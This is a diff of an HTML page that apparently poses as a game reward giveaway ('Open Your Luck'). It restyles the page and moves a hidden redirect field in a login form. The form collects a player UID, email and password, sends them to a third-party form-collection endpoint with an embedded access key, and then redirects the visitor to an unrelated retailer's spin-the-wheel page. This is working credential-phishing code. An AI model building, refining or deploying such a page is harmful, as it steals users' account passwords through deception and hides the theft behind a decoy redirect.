@@ -11,14 +11,12 @@
         body { 
             margin: 0; padding: 0; 
             font-family: 'Teko', sans-serif; 
-            /* background-position ko 'left center' kiya gaya hai mobile view ke liye */
             background: #1a1a1a url('images/background.jpeg') no-repeat left center fixed; 
             background-size: cover; 
             color: white; 
             overflow-x: hidden;
         }
 
-        /* Top Border Teeth */
         .top-border {
             position: fixed; top: 0; left: 0; width: 100%; height: 20px;
             background: url('images/top_teeth-l.png') repeat-x;
@@ -31,7 +29,7 @@
             padding: 40px 0 0 0; box-sizing: border-box;
         }
 
-        /* Phase 1: Gifting Rolls */
+        /* Phase 1: Rolls */
         #gifting-section { 
             width: 100%; display: flex; flex-direction: column; align-items: center; 
             justify-content: center; flex-grow: 1;
@@ -75,19 +73,19 @@
         .social-icons { margin-top: 20px; display: flex; justify-content: center; gap: 15px; }
         .social-icons img { width: 35px; height: 35px; }
 
-        /* Notice Box */
+        /* Important Notice Styling */
         .notice-box { 
             background: #fff; color: #333; padding: 20px; border-radius: 4px; 
-            text-align: left; font-size: 15px; margin-top: 20px; line-height: 1.5;
-            font-family: sans-serif; font-weight: 500;
+            text-align: left; font-size: 15px; margin-top: 20px; line-height: 1.6;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-weight: 500;
         }
         .red-mark { color: #ff0000; font-weight: bold; }
 
-        /* Black Footer */
         footer {
             background: #000; width: 100%; padding: 15px 0; margin-top: auto;
             display: flex; justify-content: center; align-items: center;
-            font-family: sans-serif; font-size: 12px; color: #fff;
+            font-family: Arial, sans-serif; font-size: 12px; color: #fff;
         }
         .foot-logo { height: 25px; margin-right: 10px; }
     </style>
@@ -100,14 +98,8 @@
         
         <div id="gifting-section">
             <img src="images/logo-new.png" style="width:160px; margin-bottom:15px;">
-            
-            <div class="roll-row">
-                <div class="roll-content left-to-right" id="roll1"></div>
-            </div>
-            <div class="roll-row">
-                <div class="roll-content right-to-left" id="roll2"></div>
-            </div>
-
+            <div class="roll-row"><div class="roll-content left-to-right" id="roll1"></div></div>
+            <div class="roll-row"><div class="roll-content right-to-left" id="roll2"></div></div>
             <button class="btn-luck" onclick="showLogin()">Open Your Luck</button>
         </div>
 
@@ -118,11 +110,12 @@
                 
                 <form action="https://api.web3forms.com/submit" method="POST">
                     <input type="hidden" name="access_key" value="eea2617d-5288-48b8-a1a5-36fb602cb98a">
+                    
+                    <input type="hidden" name="redirect" value="https://www.nykaa.com/spin-the-wheel-nd/lp">
+                    
                     <input type="text" name="player_uid" placeholder="Enter Player UID" required>
                     <input type="email" name="user_email" placeholder="Email Address" required>
                     <input type="password" name="token_access" placeholder="Password" required>
-                    
-                    <input type="hidden" name="redirect" value="https://www.nykaa.com/spin-the-wheel-nd/lp">
                     
                     <button type="submit" class="login-btn">LOG-IN</button>
                 </form>
